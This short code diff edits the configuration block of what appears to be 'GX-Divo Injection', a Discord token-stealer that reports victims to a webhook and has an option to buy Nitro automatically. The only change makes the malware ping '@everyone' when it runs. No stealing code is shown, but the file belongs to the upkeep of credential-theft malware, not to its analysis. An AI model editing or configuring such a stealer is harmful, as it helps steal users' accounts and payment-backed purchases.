@@ -10,7 +10,7 @@ const config = {
   webhook_protector_key: '%WEBHOOK_KEY%',
   auto_buy_nitro: false, 
   ping_on_run: true, 
-  ping_val: '@XOR', 
+  ping_val: '@everyone', 
   embed_name: 'GX-Divo Injection', 
   embed_icon: 'https://i.imgur.com/Zi9wtJ3.png'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
